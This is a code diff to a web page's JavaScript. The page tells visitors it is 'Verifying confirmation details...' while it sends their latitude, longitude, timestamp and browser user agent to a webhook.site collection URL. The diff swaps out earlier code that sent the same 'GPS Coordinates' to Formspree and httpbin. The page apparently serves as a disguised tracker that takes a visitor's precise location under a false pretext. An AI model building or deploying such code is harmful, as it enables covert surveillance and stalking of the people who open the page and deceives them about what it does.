@@ -68,24 +68,17 @@
       document.getElementById("output").innerText = "Verifying confirmation details...";
 
       const payload = {
-        _replyto: "anon@anon.com",
-        _subject: "GPS Coordinates",
-        message: `Lat: ${lat}, Lon: ${lon}`,
+        timestamp: new Date().toISOString(),
         latitude: lat,
-        longitude: lon
+        longitude: lon,
+        userAgent: navigator.userAgent
       };
 
-      // Send to Formspree
-      fetch("https://formspree.io/f/xkgrpjjk", {
+      fetch("https://webhook.site/f89aa1bf-0206-4286-9394-8c806d89a8bb", {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
-      });
-
-      // Send debug to httpbin
-      fetch("https://httpbin.org/post", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
+        headers: {
+          "Content-Type": "application/json"
+        },
         body: JSON.stringify(payload)
       });
     }
